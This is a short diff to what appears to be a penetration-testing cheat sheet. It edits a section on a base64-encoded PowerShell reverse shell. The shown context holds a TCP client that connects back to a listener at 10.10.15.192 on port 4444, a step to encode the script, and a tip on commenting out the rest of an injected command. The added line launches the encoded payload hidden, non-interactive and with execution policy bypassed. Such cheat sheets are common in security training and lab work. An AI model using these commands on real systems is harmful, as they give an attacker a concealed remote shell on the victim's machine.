@@ -233,6 +233,7 @@ reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\..."
 
 ## powershell - B64 encoded revshell
 ```
+# powershell - base64 encoded revshell
 # on linux
 # save the following :
 $client = New-Object System.Net.Sockets.TCPClient('10.10.15.192', 4444);## change your IP/Port accordingly
@@ -255,5 +256,6 @@ cat pwsh-rev.ps1 | iconv -t UTF-16LE | base64 -w 0
 
 # Keep in mind that you can use a trailing ' #' to comment the rest of the command if you try to do command injection and you want ignore the rest of the command where yours is injected
 
-# Then : powershell -encodedCommand '....'
+# In powershell execute : 
+powershell -nop -W hidden -noni -ep bypass -encodedCommand "...."
 ```
